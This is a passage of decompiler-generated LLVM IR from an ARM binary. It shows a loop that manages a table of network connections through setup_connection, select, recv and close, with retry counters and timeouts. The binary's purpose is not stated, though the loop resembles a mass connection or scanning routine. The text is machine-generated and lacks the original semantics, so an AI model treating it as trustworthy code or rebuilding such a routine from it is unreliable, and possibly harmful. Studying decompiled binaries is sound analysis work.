  store i32 %v3_fd64, i32* %v3_fde4, align 4
  %v0_fde8 = load i32, i32* %ip.global-to-local, align 4
  %v1_fde8 = trunc i32 %v0_fde8 to i16
  %v2_fde8 = load i32, i32* @r0, align 4
  %v3_fde8 = add i32 %v2_fde8, 20
  %v4_fde8 = inttoptr i32 %v3_fde8 to i16*
  store i16 %v1_fde8, i16* %v4_fde8, align 2
  %v0_fdec = call i32 @setup_connection()
  store i32 %v0_fdec, i32* %r0.global-to-local, align 4
  %v1_fc70.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_fc6c

dec_label_pc_fdf4:                                ; preds = %dec_label_pc_f6a4
  store i32 ptrtoint (i32* @global_var_26128.176 to i32), i32* %ip.global-to-local, align 4
  %v2_fdf8 = load i32, i32* @global_var_26128.176, align 4
  store i32 %v2_fdf8, i32* %r0.global-to-local, align 4
  %v1_fdfc = call i32 @__GI___libc_close(i32 %v2_fdf8)
  store i32 %v1_fdfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe00

dec_label_pc_fe00:                                ; preds = %dec_label_pc_f680, %dec_label_pc_fdf4
  %v0_fe00 = load i32, i32* @r5, align 4
  store i32 %v0_fe00, i32* %r0.global-to-local, align 4
  %v1_fe04 = call i32 @__GI_exit(i32 %v0_fe00)
  store i32 %v1_fe04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fe08

dec_label_pc_fe08.loopexit:                       ; preds = %dec_label_pc_fdb8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fe08

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fddc, %dec_label_pc_fd74, %dec_label_pc_fca0, %dec_label_pc_fc6c, %dec_label_pc_fe08.loopexit, %dec_label_pc_fe00
  %stack_var_-1880.1 = phi i32 [ %tmp314, %dec_label_pc_fe00 ], [ %stack_var_-1880.0, %dec_label_pc_fe08.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_fc6c ], [ %stack_var_-1880.0, %dec_label_pc_fca0 ], [ %stack_var_-1880.0, %dec_label_pc_fd74 ], [ %stack_var_-1880.0, %dec_label_pc_fddc ]
  %stack_var_-1876.1 = phi i16 [ %tmp342, %dec_label_pc_fe00 ], [ %stack_var_-1876.0, %dec_label_pc_fe08.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_fc6c ], [ %stack_var_-1876.0, %dec_label_pc_fca0 ], [ %stack_var_-1876.0, %dec_label_pc_fd74 ], [ %stack_var_-1876.0, %dec_label_pc_fddc ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 1668, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fe24486 = load i32, i32* @sp, align 4
  %v3_fe24487 = add i32 %v2_fe24486, 1668
  %v4_fe24488 = inttoptr i32 %v3_fe24487 to i32*
  store i32 0, i32* %v4_fe24488, align 4
  br label %dec_label_pc_fe14.dec_label_pc_fe14_crit_edge

dec_label_pc_fe14.dec_label_pc_fe14_crit_edge:    ; preds = %dec_label_pc_fe08, %dec_label_pc_fe14.dec_label_pc_fe14_crit_edge
  %v0_fe14.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fe14 = add i32 %v0_fe14.pre, 1664
  store i32 %v1_fe14, i32* %ip.global-to-local, align 4
  %v1_fe18 = add i32 %v0_fe14.pre, 4
  store i32 %v1_fe18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_fe20 = icmp eq i32 %v1_fe18, 128
  %v2_fe24 = load i32, i32* @sp, align 4
  %v3_fe24 = add i32 %v2_fe24, %v1_fe14
  %v4_fe24 = inttoptr i32 %v3_fe24 to i32*
  store i32 0, i32* %v4_fe24, align 4
  br i1 %v7_fe20, label %dec_label_pc_fe2c, label %dec_label_pc_fe14.dec_label_pc_fe14_crit_edge

dec_label_pc_fe2c:                                ; preds = %dec_label_pc_fe14.dec_label_pc_fe14_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fe2c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_fe2c, i32* %stack_var_-352, align 4
  %v1_fe34480 = add i32 %v0_fe2c, 1540
  store i32 %v1_fe34480, i32* @lr, align 4
  %v1_fe38481 = add i32 %v0_fe2c, 8
  store i32 %v1_fe38481, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_fe40482 = icmp eq i32 %v1_fe38481, 128
  %v2_fe44483 = load i32, i32* @sp, align 4
  %v3_fe44484 = add i32 %v2_fe44483, %v1_fe34480
  %v4_fe44485 = inttoptr i32 %v3_fe44484 to i32*
  store i32 0, i32* %v4_fe44485, align 4
  br i1 %v7_fe40482, label %dec_label_pc_fe4c, label %dec_label_pc_fe34.dec_label_pc_fe34_crit_edge

dec_label_pc_fe34.dec_label_pc_fe34_crit_edge:    ; preds = %dec_label_pc_fe2c, %dec_label_pc_fe34.dec_label_pc_fe34_crit_edge
  %v0_fe34.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_fe34 = add i32 %v0_fe34.pre, 1536
  store i32 %v1_fe34, i32* @lr, align 4
  %v1_fe38 = add i32 %v0_fe34.pre, 4
  store i32 %v1_fe38, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_fe40 = icmp eq i32 %v1_fe38, 128
  %v2_fe44 = load i32, i32* @sp, align 4
  %v3_fe44 = add i32 %v2_fe44, %v1_fe34
  %v4_fe44 = inttoptr i32 %v3_fe44 to i32*
  store i32 0, i32* %v4_fe44, align 4
  br i1 %v7_fe40, label %dec_label_pc_fe4c, label %dec_label_pc_fe34.dec_label_pc_fe34_crit_edge

dec_label_pc_fe4c:                                ; preds = %dec_label_pc_fe34.dec_label_pc_fe34_crit_edge, %dec_label_pc_fe2c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fe4c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_fe4c, i32* @r6, align 4
  store i32 %v0_fe4c, i32* @r5, align 4
  %v5_fe54 = trunc i32 %v0_fe4c to i16
  store i16 %v5_fe54, i16* %stack_var_-52, align 2
  %v2_10cf0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_feac

dec_label_pc_fe5c:                                ; preds = %dec_label_pc_fedc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fec8, i1* %cpsr_z.global-to-local, align 1
  %v1_10ce0 = add i32 %v2_fec0, 4
  %v2_10ce0 = inttoptr i32 %v1_10ce0 to i32*
  %v3_10ce0 = load i32, i32* %v2_10ce0, align 4
  br i1 %v7_fec8, label %dec_label_pc_10ce0, label %dec_label_pc_fe64

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe5c
  store i32 %v3_10ce0, i32* %ip.global-to-local, align 4
  %v3_fe6c = udiv i32 %v3_10ce0, 32
  store i32 %v2_10cf0, i32* %r0.global-to-local, align 4
  %v3_fe74 = mul nuw nsw i32 %v3_fe6c, 4
  %v2_fe78 = add i32 %v3_fe74, %v2_10cf0
  store i32 %v2_fe78, i32* %r3.global-to-local, align 4
  %v1_fe7c = add i32 %v2_fe78, -184
  %v2_fe7c = inttoptr i32 %v1_fe7c to i32*
  %v3_fe7c = load i32, i32* %v2_fe7c, align 4
  %v1_fe80 = urem i32 %v3_10ce0, 32
  store i32 %v1_fe80, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_fe88 = shl i32 1, %v1_fe80
  %v8_fe88 = or i32 %v3_fe7c, %v7_fe88
  store i32 %v8_fe88, i32* %r2.global-to-local, align 4
  store i32 %v8_fe88, i32* %v2_fe7c, align 4
  %v0_fe90 = load i32, i32* @r6, align 4
  %v1_fe90 = load i32, i32* %ip.global-to-local, align 4
  %v3_fe90 = icmp uge i32 %v0_fe90, %v1_fe90
  store i1 %v3_fe90, i1* %cpsr_c.global-to-local, align 1
  %v9_fe90 = icmp eq i32 %v0_fe90, %v1_fe90
  store i1 %v9_fe90, i1* %cpsr_z.global-to-local, align 1
  %v5_fe94 = icmp slt i32 %v0_fe90, %v1_fe90
  br i1 %v5_fe94, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_fe64
  store i32 %v1_fe90, i32* @r6, align 4
  br label %bb378

bb378:                                            ; preds = %.thread56, %bb384, %bb382, %bb428, %dec_label_pc_ff40, %dec_label_pc_fe64, %bb377
  %v3_fe98 = load i16, i16* %stack_var_-52, align 2
  %v4_fe98 = sext i16 %v3_fe98 to i32
  store i32 %v4_fe98, i32* %r3.global-to-local, align 4
  %v1_fe9c = add nsw i32 %v4_fe98, 1
  store i32 %v1_fe9c, i32* %r2.global-to-local, align 4
  %v2_fea0 = icmp ugt i32 %v1_fe9c, 254
  store i1 %v2_fea0, i1* %cpsr_c.global-to-local, align 1
  %v7_fea0 = icmp eq i32 %v1_fe9c, 255
  store i1 %v7_fea0, i1* %cpsr_z.global-to-local, align 1
  %v5_fea4 = trunc i32 %v1_fe9c to i16
  store i16 %v5_fea4, i16* %stack_var_-52, align 2
  %v8_fea8 = icmp sgt i16 %v3_fe98, 254
  br i1 %v8_fea8, label %dec_label_pc_ff4c, label %dec_label_pc_feac

dec_label_pc_feac:                                ; preds = %bb378, %dec_label_pc_fe4c
  %v0_feb8 = phi i32 [ %v1_fe9c, %bb378 ], [ %v0_fe4c, %dec_label_pc_fe4c ]
  store i32 ptrtoint (i32* @global_var_26124.174 to i32), i32* %r0.global-to-local, align 4
  %v3_feb0 = mul i32 %v0_feb8, 256
  store i32 %v3_feb0, i32* %r3.global-to-local, align 4
  %v2_feb4 = load i32, i32* @global_var_26124.174, align 4
  store i32 %v2_feb4, i32* @r1, align 4
  %v2_febc = mul i32 %v0_feb8, 288
  store i32 %v2_febc, i32* %r2.global-to-local, align 4
  %v2_fec0 = add i32 %v2_feb4, %v2_febc
  store i32 %v2_fec0, i32* @r4, align 4
  %v1_fec4 = add i32 %v2_fec0, 12
  %v2_fec4 = inttoptr i32 %v1_fec4 to i32*
  %v3_fec4 = load i32, i32* %v2_fec4, align 4
  store i32 %v3_fec4, i32* %ip.global-to-local, align 4
  %v2_fec8 = icmp ne i32 %v3_fec4, 0
  store i1 %v2_fec8, i1* %cpsr_c.global-to-local, align 1
  %v7_fec8 = icmp eq i32 %v3_fec4, 1
  store i1 %v7_fec8, i1* %cpsr_z.global-to-local, align 1
  %v2_fecc = xor i1 %v2_fec8, true
  %v3_fecc = or i1 %v7_fec8, %v2_fecc
  br i1 %v3_fecc, label %bb379, label %bb380

bb379:                                            ; preds = %dec_label_pc_feac
  store i32 5, i32* @r1, align 4
  br label %bb380

bb380:                                            ; preds = %dec_label_pc_feac, %bb379
  %v1_feec173 = phi i32 [ %v2_feb4, %dec_label_pc_feac ], [ 5, %bb379 ]
  %v2_fed0 = xor i1 %v7_fec8, true
  %v3_fed0 = and i1 %v2_fec8, %v2_fed0
  br i1 %v3_fed0, label %bb381, label %bb382

bb381:                                            ; preds = %bb380
  store i32 30, i32* @r1, align 4
  br label %bb382

bb382:                                            ; preds = %bb380, %bb381
  %v1_feec = phi i32 [ %v1_feec173, %bb380 ], [ 30, %bb381 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fed4 = icmp eq i32 %v3_fec4, 0
  store i1 %v2_fed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fed4, label %bb378, label %dec_label_pc_fedc

dec_label_pc_fedc:                                ; preds = %bb382
  store i32 ptrtoint (i32* @global_var_23644.163 to i32), i32* %r2.global-to-local, align 4
  %v2_fee0 = load i32, i32* @global_var_23644.163, align 4
  store i32 %v2_fee0, i32* %r3.global-to-local, align 4
  %v1_fee4 = add i32 %v2_fec0, 8
  %v2_fee4 = inttoptr i32 %v1_fee4 to i32*
  %v3_fee4 = load i32, i32* %v2_fee4, align 4
  store i32 %v3_fee4, i32* %r2.global-to-local, align 4
  %v2_fee8 = sub i32 %v2_fee0, %v3_fee4
  store i32 %v2_fee8, i32* %r3.global-to-local, align 4
  %v3_feec = icmp uge i32 %v2_fee8, %v1_feec
  store i1 %v3_feec, i1* %cpsr_c.global-to-local, align 1
  %v9_feec = icmp eq i32 %v2_fee8, %v1_feec
  store i1 %v9_feec, i1* %cpsr_z.global-to-local, align 1
  %v2_fef0 = xor i1 %v3_feec, true
  %v3_fef0 = or i1 %v9_feec, %v2_fef0
  br i1 %v3_fef0, label %dec_label_pc_fe5c, label %dec_label_pc_fef4

dec_label_pc_fef4:                                ; preds = %dec_label_pc_fedc
  %v1_fef4 = add i32 %v2_fec0, 4
  %v2_fef4 = inttoptr i32 %v1_fef4 to i32*
  %v3_fef4 = load i32, i32* %v2_fef4, align 4
  store i32 %v3_fef4, i32* %r0.global-to-local, align 4
  %v1_fef8 = call i32 @__GI___libc_close(i32 %v3_fef4)
  store i32 %v1_fef8, i32* %r0.global-to-local, align 4
  %v0_fefc = load i32, i32* @r4, align 4
  %v1_fefc = add i32 %v0_fefc, 12
  %v2_fefc = inttoptr i32 %v1_fefc to i32*
  %v3_fefc = load i32, i32* %v2_fefc, align 4
  store i32 %v3_fefc, i32* %r3.global-to-local, align 4
  %v2_ff00 = icmp ugt i32 %v3_fefc, 1
  store i1 %v2_ff00, i1* %cpsr_c.global-to-local, align 1
  %v7_ff00 = icmp eq i32 %v3_fefc, 2
  store i1 %v7_ff00, i1* %cpsr_z.global-to-local, align 1
  %v2_ff04 = xor i1 %v2_ff00, true
  %v3_ff04 = or i1 %v7_ff00, %v2_ff04
  br i1 %v3_ff04, label %bb383, label %.thread279

.thread279:                                       ; preds = %dec_label_pc_fef4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ff0c276280 = add i32 %v0_fefc, 4
  %v3_ff0c277281 = inttoptr i32 %v2_ff0c276280 to i32*
  store i32 -1, i32* %v3_ff0c277281, align 4
  br label %bb384

bb383:                                            ; preds = %dec_label_pc_fef4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ff0c273 = add i32 %v0_fefc, 4
  %v3_ff0c274 = inttoptr i32 %v2_ff0c273 to i32*
  store i32 -1, i32* %v3_ff0c274, align 4
  %v4_ff10 = load i32, i32* %r3.global-to-local, align 4
  %v5_ff10 = load i32, i32* @r4, align 4
  %v6_ff10 = add i32 %v5_ff10, 12
  %v7_ff10 = inttoptr i32 %v6_ff10 to i32*
  store i32 %v4_ff10, i32* %v7_ff10, align 4
  %v4_ff14 = load i32, i32* %r3.global-to-local, align 4
  %v5_ff14 = trunc i32 %v4_ff14 to i8
  %v6_ff14 = load i32, i32* @r4, align 4
  %v7_ff14 = add i32 %v6_ff14, 284
  %v8_ff14 = inttoptr i32 %v7_ff14 to i8*
  store i8 %v5_ff14, i8* %v8_ff14, align 1
  %v0_ff18.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ff18.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb384

bb384:                                            ; preds = %.thread279, %bb383
  %v1_ff18 = phi i1 [ %v1_ff18.pre, %bb383 ], [ %v2_ff00, %.thread279 ]
  %v0_ff18 = phi i1 [ %v0_ff18.pre, %bb383 ], [ false, %.thread279 ]
  %v2_ff18 = xor i1 %v1_ff18, true
  %v3_ff18 = or i1 %v0_ff18, %v2_ff18
  br i1 %v3_ff18, label %bb378, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %bb384
  %v0_ff1c = load i32, i32* @r4, align 4
  %v1_ff1c = add i32 %v0_ff1c, 284
  %v2_ff1c = inttoptr i32 %v1_ff1c to i8*
  %v3_ff1c = load i8, i8* %v2_ff1c, align 1
  %v4_ff1c = zext i8 %v3_ff1c to i32
  %v1_ff20 = add nuw nsw i32 %v4_ff1c, 1
  %v1_ff24 = urem i32 %v1_ff20, 256
  store i32 %v1_ff24, i32* %r3.global-to-local, align 4
  %v2_ff28 = icmp ugt i32 %v1_ff24, 9
  store i1 %v2_ff28, i1* %cpsr_c.global-to-local, align 1
  %v7_ff28 = icmp eq i32 %v1_ff24, 10
  store i1 %v7_ff28, i1* %cpsr_z.global-to-local, align 1
  %v1_ff2c = trunc i32 %v1_ff20 to i8
  store i8 %v1_ff2c, i8* %v2_ff1c, align 1
  %v0_ff30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff30, label %.thread56, label %dec_label_pc_ff40

.thread56:                                        ; preds = %dec_label_pc_ff1c
  %v1_ff30 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff30 = add i32 %v1_ff30, -10
  store i32 %v2_ff30, i32* %r3.global-to-local, align 4
  %v2_ff34 = load i32, i32* @r4, align 4
  %v3_ff34 = add i32 %v2_ff34, 12
  %v4_ff34 = inttoptr i32 %v3_ff34 to i32*
  store i32 %v2_ff30, i32* %v4_ff34, align 4
  %v1_ff38 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff38 = trunc i32 %v1_ff38 to i8
  %v3_ff38 = load i32, i32* @r4, align 4
  %v4_ff38 = add i32 %v3_ff38, 284
  %v5_ff38 = inttoptr i32 %v4_ff38 to i8*
  store i8 %v2_ff38, i8* %v5_ff38, align 1
  %v0_ff3c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff3c.pr.pr, label %bb378, label %dec_label_pc_ff40

dec_label_pc_ff40:                                ; preds = %dec_label_pc_ff1c, %.thread56
  %v0_ff40 = load i32, i32* @r4, align 4
  store i32 %v0_ff40, i32* @r0, align 4
  %v0_ff44 = call i32 @setup_connection()
  store i32 %v0_ff44, i32* %r0.global-to-local, align 4
  br label %bb378

dec_label_pc_ff4c:                                ; preds = %bb378
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_ff58 = load i32, i32* @r5, align 4
  %v1_ff58 = load i32, i32* @r6, align 4
  %v3_ff58 = icmp uge i32 %v0_ff58, %v1_ff58
  store i1 %v3_ff58, i1* %cpsr_c.global-to-local, align 1
  %v9_ff58 = icmp eq i32 %v0_ff58, %v1_ff58
  store i1 %v9_ff58, i1* %cpsr_z.global-to-local, align 1
  %v5_ff5c = icmp slt i32 %v0_ff58, %v1_ff58
  %storemerge134 = select i1 %v5_ff5c, i32 %v1_ff58, i32 %v0_ff58
  %v2_ff68 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_ff68, i32* %ip.global-to-local, align 4
  %v2_ff6c = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_ff6c, i32* %r1.global-to-local, align 4
  %v2_ff70 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_ff70, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ff78 = add i32 %storemerge134, 1
  store i32 %v1_ff78, i32* %r0.global-to-local, align 4
  %v5_ff84 = call i32 @__libc_select(i32 %v1_ff78, i32 %v2_ff6c, i32 %v2_ff70, i32 0, i32 %v2_ff68)
  %v0_ff88 = load i32, i32* @r4, align 4
  store i32 %v0_ff88, i32* %r0.global-to-local, align 4
  %v1_ff8c = inttoptr i32 %v0_ff88 to i32*
  %v2_ff8c = call i32 @__GI_time(i32* %v1_ff8c)
  store i32 %v2_ff8c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23644.163 to i32), i32* @lr, align 4
  %v0_ff94 = load i32, i32* @r4, align 4
  %v5_ff94 = trunc i32 %v0_ff94 to i16
  store i16 %v5_ff94, i16* %stack_var_-52, align 2
  store i32 %v2_ff8c, i32* @global_var_23644.163, align 4
  %v2_10970 = ptrtoint i32* %stack_var_-45 to i32
  %v2_10984 = ptrtoint i32* %stack_var_-80 to i32
  %v2_1098c = ptrtoint i32* %stack_var_-77 to i32
  %v2_10740 = ptrtoint i32* %stack_var_-60 to i32
  %v2_10754 = ptrtoint i8* %stack_var_-56 to i32
  %v2_1075c = bitcast i8* %stack_var_-56 to i32*
  %v2_10a7c = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_ff9c

dec_label_pc_ff9c:                                ; preds = %dec_label_pc_10110, %dec_label_pc_ff4c
  %v0_ffa8 = phi i32 [ %v1_10114, %dec_label_pc_10110 ], [ %v0_ff94, %dec_label_pc_ff4c ]
  store i32 ptrtoint (i32* @global_var_26124.174 to i32), i32* %r0.global-to-local, align 4
  %v3_ffa0 = mul i32 %v0_ffa8, 256
  store i32 %v3_ffa0, i32* %r3.global-to-local, align 4
  %v2_ffa4 = load i32, i32* @global_var_26124.174, align 4
  store i32 %v2_ffa4, i32* %r1.global-to-local, align 4
  %v2_ffac = mul i32 %v0_ffa8, 288
  store i32 %v2_ffac, i32* %r2.global-to-local, align 4
  %v2_ffb0 = add i32 %v2_ffa4, %v2_ffac
  store i32 %v2_ffb0, i32* @r5, align 4
  %v1_ffb4 = add i32 %v2_ffb0, 4
  %v2_ffb4 = inttoptr i32 %v1_ffb4 to i32*
  %v3_ffb4 = load i32, i32* %v2_ffb4, align 4
  store i32 %v3_ffb4, i32* %r0.global-to-local, align 4
  %v2_ffb8 = icmp eq i32 %v3_ffb4, -1
  store i1 %v2_ffb8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffb8 = icmp eq i32 %v3_ffb4, -1
  store i1 %v7_ffb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffb8, label %dec_label_pc_10110, label %dec_label_pc_ffc0

dec_label_pc_ffc0:                                ; preds = %dec_label_pc_ff9c
  %v3_ffc0 = udiv i32 %v3_ffb4, 32
  store i32 %v2_10cf0, i32* %r1.global-to-local, align 4
  %v3_ffcc = mul nuw nsw i32 %v3_ffc0, 4
  store i32 %v3_ffcc, i32* @ip, align 4
  %v2_ffd0 = add i32 %v3_ffcc, %v2_10cf0
  store i32 %v2_ffd0, i32* %r2.global-to-local, align 4
  %v1_ffd4 = add i32 %v2_ffd0, -312
  %v2_ffd4 = inttoptr i32 %v1_ffd4 to i32*
  %v3_ffd4 = load i32, i32* %v2_ffd4, align 4
  %v1_ffd8 = urem i32 %v3_ffb4, 32
  store i32 %v1_ffd8, i32* %r1.global-to-local, align 4
  %v2_ffdc = add nsw i32 %v1_ffd8, -1
  %v3_ffdc = shl i32 1, %v2_ffdc
  %v4_ffdc = and i32 %v3_ffd4, %v3_ffdc
  %v5_ffdc = icmp ne i32 %v4_ffdc, 0
  store i1 %v5_ffdc, i1* %cpsr_c.global-to-local, align 1
  %v6_ffdc = ashr i32 %v3_ffd4, %v1_ffd8
  store i32 %v6_ffdc, i32* %r3.global-to-local, align 4
  %v1_ffe0 = urem i32 %v6_ffdc, 2
  %v2_ffe0 = icmp eq i32 %v1_ffe0, 0
  store i1 %v2_ffe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffe0, label %dec_label_pc_ffe8, label %dec_label_pc_10b60

dec_label_pc_ffe8:                                ; preds = %dec_label_pc_ffc0, %dec_label_pc_10c10
  %v1_fff8 = phi i32 [ %v1_ffd8, %dec_label_pc_ffc0 ], [ %v1_fff8.pre, %dec_label_pc_10c10 ]
  %v0_fff0 = phi i32 [ %v3_ffcc, %dec_label_pc_ffc0 ], [ %v0_fff0.pre, %dec_label_pc_10c10 ]
  store i32 %v2_10cf0, i32* %r3.global-to-local, align 4
  %v2_fff0 = add i32 %v0_fff0, %v2_10cf0
  store i32 %v2_fff0, i32* %r2.global-to-local, align 4
  %v1_fff4 = add i32 %v2_fff0, -184
  %v2_fff4 = inttoptr i32 %v1_fff4 to i32*
  %v3_fff4 = load i32, i32* %v2_fff4, align 4
  %v2_fff8 = add i32 %v1_fff8, -1
  %v3_fff8 = shl i32 1, %v2_fff8
  %v4_fff8 = and i32 %v3_fff4, %v3_fff8
  %v5_fff8 = icmp ne i32 %v4_fff8, 0
  store i1 %v5_fff8, i1* %cpsr_c.global-to-local, align 1
  %v6_fff8 = ashr i32 %v3_fff4, %v1_fff8
  store i32 %v6_fff8, i32* %r3.global-to-local, align 4
  %v1_fffc = urem i32 %v6_fff8, 2
  %v2_fffc = icmp eq i32 %v1_fffc, 0
  store i1 %v2_fffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fffc, label %dec_label_pc_10110, label %dec_label_pc_10004.preheader

dec_label_pc_10004.preheader:                     ; preds = %dec_label_pc_ffe8
  %v0_10004156 = load i32, i32* @r5, align 4
  %v1_10004157 = add i32 %v0_10004156, 12
  %v2_10004158 = inttoptr i32 %v1_10004157 to i32*
  %v3_10004159 = load i32, i32* %v2_10004158, align 4
  store i32 %v3_10004159, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10008155161 = icmp eq i32 %v3_10004159, 0
  store i1 %v2_10008155161, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10008155161, label %dec_label_pc_10110, label %dec_label_pc_10010.lr.ph

dec_label_pc_10004.loopexit:                      ; preds = %dec_label_pc_10a20, %dec_label_pc_10890
  %v0_10004 = load i32, i32* @r5, align 4
  %v1_10004 = add i32 %v0_10004, 12
  %v2_10004 = inttoptr i32 %v1_10004 to i32*
  %v3_10004 = load i32, i32* %v2_10004, align 4
  store i32 %v3_10004, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10008155 = icmp eq i32 %v3_10004, 0
  store i1 %v2_10008155, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10008155, label %dec_label_pc_10110, label %dec_label_pc_10010.lr.ph

dec_label_pc_10010.lr.ph:                         ; preds = %dec_label_pc_10004.preheader, %dec_label_pc_10004.loopexit
  %v0_10010189 = phi i32 [ %v0_10004, %dec_label_pc_10004.loopexit ], [ %v0_10004156, %dec_label_pc_10004.preheader ]
  br label %dec_label_pc_10010

dec_label_pc_10010:                               ; preds = %dec_label_pc_10008.backedge.thread, %dec_label_pc_10008.backedge, %dec_label_pc_10008.backedge.thread528, %dec_label_pc_10010.lr.ph
  %v0_10af0 = phi i32 [ %v0_10010189, %dec_label_pc_10010.lr.ph ], [ %v0_10010186, %dec_label_pc_10008.backedge ], [ %v0_10084, %dec_label_pc_10008.backedge.thread ], [ %v0_10084, %dec_label_pc_10008.backedge.thread528 ]
  %v1_10010 = add i32 %v0_10af0, 24
  %v2_10010 = inttoptr i32 %v1_10010 to i32*
  %v3_10010 = load i32, i32* %v2_10010, align 4
  store i32 %v3_10010, i32* @r3, align 4
  %v2_10014 = icmp ugt i32 %v3_10010, 255
  store i1 %v2_10014, i1* %cpsr_c.global-to-local, align 1
  %v7_10014 = icmp eq i32 %v3_10010, 256
  store i1 %v7_10014, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_10af0, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_10014, label %dec_label_pc_10af0, label %dec_label_pc_10020

dec_label_pc_10020:                               ; preds = %dec_label_pc_10010, %dec_label_pc_10af0
  store i32 0, i32* @r6, align 4
  %v1_10024 = load i32, i32* @sb, align 4
  %v2_10024 = inttoptr i32 %v1_10024 to i32*
  store i32 0, i32* %v2_10024, align 4
  %v0_10028 = load i32, i32* @r5, align 4
  %v1_10028 = add i32 %v0_10028, 24
  %v2_10028 = inttoptr i32 %v1_10028 to i32*
  %v3_10028 = load i32, i32* %v2_10028, align 4
  store i32 %v3_10028, i32* %r2.global-to-local, align 4
  %v0_1002c = load i32, i32* @sl, align 4
  %v2_1002c = add i32 %v0_1002c, %v3_10028
  store i32 %v2_1002c, i32* @r4, align 4
  %v1_10030 = add i32 %v0_10028, 4
  %v2_10030 = inttoptr i32 %v1_10030 to i32*
  %v3_10030 = load i32, i32* %v2_10030, align 4
  store i32 %v3_10030, i32* %r0.global-to-local, align 4
  %v1_10034 = sub i32 256, %v3_10028
  store i32 %v1_10034, i32* %r2.global-to-local, align 4
  store i32 %v2_1002c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10040 = call i32 @__libc_recv(i32 %v3_10030, i32 %v2_1002c, i32 %v1_10034, i32 16384)
  store i32 %v4_10040, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10044 = icmp eq i32 %v4_10040, 0
  store i1 %v2_10044, i1* %cpsr_z.global-to-local, align 1
  %tmp385 = icmp slt i32 %v4_10040, 1
  br i1 %tmp385, label %dec_label_pc_100bc, label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %dec_label_pc_10020
  %v0_1004c = load i32, i32* @r6, align 4
  store i32 %v0_1004c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10050

dec_label_pc_10050:                               ; preds = %.thread63, %dec_label_pc_1004c
  %v3_1005c = phi i32 [ %v1_10060, %.thread63 ], [ %v0_1004c, %dec_label_pc_1004c ]
  %v1_10050 = load i32, i32* @r4, align 4
  %v2_10050 = add i32 %v1_10050, %v3_1005c
  %v3_10050 = inttoptr i32 %v2_10050 to i8*
  %v4_10050 = load i8, i8* %v3_10050, align 1
  %v6_10050 = zext i8 %v4_10050 to i32
  store i32 %v6_10050, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10054 = icmp eq i8 %v4_10050, 0
  store i1 %v2_10054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10054, label %bb386, label %.thread63

bb386:                                            ; preds = %dec_label_pc_10050
  %v2_10058 = add nuw nsw i32 %v6_10050, 65
  store i32 %v2_10058, i32* %r3.global-to-local, align 4
  %v2_1005c = trunc i32 %v2_10058 to i8
